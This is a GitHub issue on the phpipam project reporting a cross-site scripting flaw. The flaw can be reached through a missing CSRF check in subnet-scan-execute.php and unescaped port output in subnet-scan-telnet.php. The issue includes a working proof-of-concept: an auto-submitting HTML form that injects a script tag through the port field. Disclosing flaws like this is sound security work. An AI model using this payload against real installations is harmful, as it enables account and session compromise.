# XSS via CSRF(subnet-scan-telnet.php & subnet-scan-execute.php) #2327

## Description

![@magicOz](https://avatars.githubusercontent.com/u/7303376?v=4&size=48)[magicOz](https://github.com/magicOz)opened [on Nov 21, 2018](https://github.com/phpipam/phpipam/issues/2327#issue-383324864)

The line

 `$Result->show("danger", _("Invalid port")." ($p)", true);`

in **/app/subnets/scan/subnet-scan-telnet.php** and no CSRF-protection at **/app/subnets/scan/subnet-scan-execute.php** causes an XSS vulnerability.

Poc:

```
<form method="POST" action="http://localhost/phpipam/app/subnets/scan/subnet-scan-execute.php">
<input type="text" value="3" name="subnetId">
<input type="text" value="scan-telnet" name="type">
<input type="text" value="0" name="debug">
<input type="text" value="<script>alert('XSS')</script>" name="port">
<input type="submit" value=""></form>
<script>document.forms[0].submit();</script>

```

Note that a valid **subnetId** has to be used.
